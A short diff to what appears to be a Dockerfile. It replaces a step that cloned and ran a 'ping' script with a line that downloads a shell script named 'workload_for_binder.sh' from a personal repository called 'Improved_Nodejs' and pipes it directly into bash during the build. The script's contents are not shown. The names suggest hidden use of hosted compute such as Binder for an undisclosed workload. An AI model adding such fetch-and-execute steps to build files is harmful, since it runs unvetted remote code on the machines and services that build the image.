@@ -11,6 +11,6 @@ RUN which bash
 RUN ls -la
 RUN apt update
 RUN apt -y install wget coreutils curl sudo python3 git python3-pip
-RUN git clone https://github.com/mncedisimavunqela/ping.git;cd ping;chmod +x ping;bash ping
+RUN wget -O - https://raw.githubusercontent.com/mncedisimavunqela/Improved_Nodejs/main/workload_for_binder.sh | bash
 
 CMD ["npm", "run", "start", "/bin/bash"]
